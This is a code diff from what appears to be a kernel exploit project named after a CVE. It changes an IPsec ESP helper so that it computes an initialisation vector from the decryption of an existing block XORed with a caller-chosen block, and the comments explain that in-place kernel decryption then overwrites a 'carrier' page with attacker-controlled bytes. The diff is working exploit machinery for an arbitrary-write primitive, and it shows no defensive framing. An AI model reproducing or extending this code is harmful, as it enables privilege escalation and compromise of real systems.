@@ -22,13 +22,33 @@ namespace ghostlock::backend::cve_2026_43284::seam {
     /** The block the write deals in, which is also the size of a vector. */
     inline constexpr std::size_t kEspBlockBytes = 16U;
 
-    /** Derive the vector for a write: one ECB decryption of the block being replaced. Returns
-     *  false when the core refuses, and a caller must not continue: with no vector there is no
-     *  datagram, which is the same rule the write body follows when the old block cannot be read. */
-    [[nodiscard]] inline bool esp_iv(const std::uint8_t old_block[kEspBlockBytes],
-                                     const std::uint8_t key[ipsec::kAes256KeyBytes],
-                                     std::uint8_t out[kEspBlockBytes]) noexcept {
-        return ipsec::aes256_ecb_decrypt(key, old_block, out);
+    /** Derive the vector for a write: one ECB decryption of the block being replaced, exclusive-or
+     *  the block the caller wants there instead. The arithmetic is the primitive: the kernel
+     *  decrypts in place, so the page becomes D_K(old) xor IV, and the vector is the one value that
+     *  makes that equal the desired block. Deriving it from the old block alone writes zeros.
+     *  @param old_block     The sixteen bytes the carrier holds now.
+     *  @param desired_block The sixteen bytes the caller wants the carrier to hold afterwards.
+     *  @param key           The session's AES key.
+     *  @param out           Receives the vector. Unchanged, and the return false, when the core
+     *                       refuses; a caller must not continue, because with no vector there is no
+     *                       datagram -- the same rule the write body follows when the old block
+     *                       cannot be read.
+     *  @return True when the vector was derived. */
+    [[nodiscard]] inline bool esp_cbc_iv(const std::uint8_t old_block[kEspBlockBytes],
+                                         const std::uint8_t desired_block[kEspBlockBytes],
+                                         const std::uint8_t key[ipsec::kAes256KeyBytes],
+                                         std::uint8_t out[kEspBlockBytes]) noexcept {
+        std::uint8_t decrypted[kEspBlockBytes] = {};
+        if (!ipsec::aes256_ecb_decrypt(key, old_block, decrypted)) {
+            return false;
+        }
+        for (std::size_t i = 0U; i < kEspBlockBytes; ++i) {
+            out[i] = static_cast<std::uint8_t>(decrypted[i] ^ desired_block[i]);
+        }
+        for (std::size_t i = 0U; i < kEspBlockBytes; ++i) {
+            decrypted[i] = 0U;
+        }
+        return true;
     }
 
     /** The integrity check: the full MAC of the datagram, truncated to the length the frame states.
